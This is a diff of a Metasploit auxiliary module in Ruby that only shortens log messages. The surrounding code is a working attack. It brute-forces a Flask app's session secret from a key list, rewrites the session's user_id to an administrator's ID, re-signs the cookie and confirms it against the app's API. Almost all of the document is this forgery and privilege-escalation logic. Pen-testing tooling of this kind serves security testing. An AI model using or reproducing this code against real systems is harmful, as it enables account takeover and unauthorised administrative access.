@@ -79,25 +79,25 @@ class MetasploitModule < Msf::Auxiliary
   def get_secret_key(cookie)
     File.open(datastore['SECRET_KEYS_FILE'], 'rb').each do |secret|
       secret = secret.strip
-      vprint_status("#{peer} - Checking secret key: #{secret}")
+      vprint_status("Checking secret key: #{secret}")
 
       unescaped_secret = Rex::Text.dehex(secret.gsub('\\', '\\').gsub('\\n', "\n").gsub('\\t', "\t"))
       unless Msf::Exploit::Remote::HTTP::FlaskUnsign::Session.valid?(cookie, unescaped_secret)
-        vprint_bad("#{peer} - Incorrect secret key: #{secret}")
+        vprint_bad("Incorrect secret key: #{secret}")
         next
       end
 
-      print_good("#{peer} - Found secret key: #{secret}")
+      print_good("Found secret key: #{secret}")
       return secret
     end
     nil
   end
 
   def validate_cookie(decoded_cookie, secret_key)
-    print_status("#{peer} - Attempting to resign with key: #{secret_key}")
+    print_status("Attempting to resign with key: #{secret_key}")
     encoded_cookie = Msf::Exploit::Remote::HTTP::FlaskUnsign::Session.sign(decoded_cookie, secret_key)
 
-    print_status("#{peer} - New signed cookie: #{encoded_cookie}")
+    print_status("New signed cookie: #{encoded_cookie}")
     cookie_jar.clear
     res = send_request_cgi(
       'uri' => normalize_uri(target_uri.path, 'api', 'v1', 'me', '/'),
@@ -106,11 +106,11 @@ class MetasploitModule < Msf::Auxiliary
     )
     fail_with(Failure::Unreachable, "#{peer} - Could not connect to web service - no response") if res.nil?
     if res.code == 401
-      print_bad("#{peer} - Cookie not accepted")
+      print_bad("Cookie not accepted")
       return nil
     end
     data = res.get_json_document
-    print_good("#{peer} - Cookie validated to user: #{data['result']['username']}")
+    print_good("Cookie validated to user: #{data['result']['username']}")
     return encoded_cookie
   end
 
@@ -125,12 +125,12 @@ class MetasploitModule < Msf::Auxiliary
     fail_with(Failure::NotFound, 'Unable to determine csrf token') unless res.body =~ /name="csrf_token" type="hidden" value="([\w.-]+)">/
 
     csrf_token = Regexp.last_match(1)
-    vprint_status("#{peer} - CSRF Token: #{csrf_token}")
+    vprint_status("CSRF Token: #{csrf_token}")
     cookie = res.get_cookies.to_s
-    print_status("#{peer} - Initial Cookie: #{cookie}")
+    print_status("Initial Cookie: #{cookie}")
     decoded_cookie = Msf::Exploit::Remote::HTTP::FlaskUnsign::Session.decode(cookie.split('=')[1].gsub(';', ''))
-    print_status("#{peer} - Decoded Cookie: #{decoded_cookie}")
-    print_status("#{peer} - Attempting login")
+    print_status("Decoded Cookie: #{decoded_cookie}")
+    print_status("Attempting login")
     res = send_request_cgi({
       'uri' => normalize_uri(target_uri.path, 'login', '/'),
       'keep_cookies' => true,
@@ -145,7 +145,7 @@ class MetasploitModule < Msf::Auxiliary
     fail_with(Failure::Unreachable, "#{peer} - Could not connect to web service - no response") if res.nil?
     fail_with(Failure::NoAccess, "#{peer} - Failed login") if res.body.include? 'Sign In'
     cookie = res.get_cookies.to_s
-    print_good("#{peer} - Logged in Cookie: #{cookie}")
+    print_good("Logged in Cookie: #{cookie}")
 
     # get the cookie value and strip off anything else
     cookie = cookie.split('=')[1].gsub(';', '')
@@ -155,7 +155,7 @@ class MetasploitModule < Msf::Auxiliary
 
     decoded_cookie = Msf::Exploit::Remote::HTTP::FlaskUnsign::Session.decode(cookie)
     decoded_cookie['user_id'] = datastore['ADMIN_ID']
-    print_status("#{peer} - Modified cookie: #{decoded_cookie}")
+    print_status("Modified cookie: #{decoded_cookie}")
     admin_cookie = validate_cookie(decoded_cookie, secret_key)
 
     fail_with(Failure::NoAccess, "#{peer} - Unable to sign cookie with a valid secret") if admin_cookie.nil?
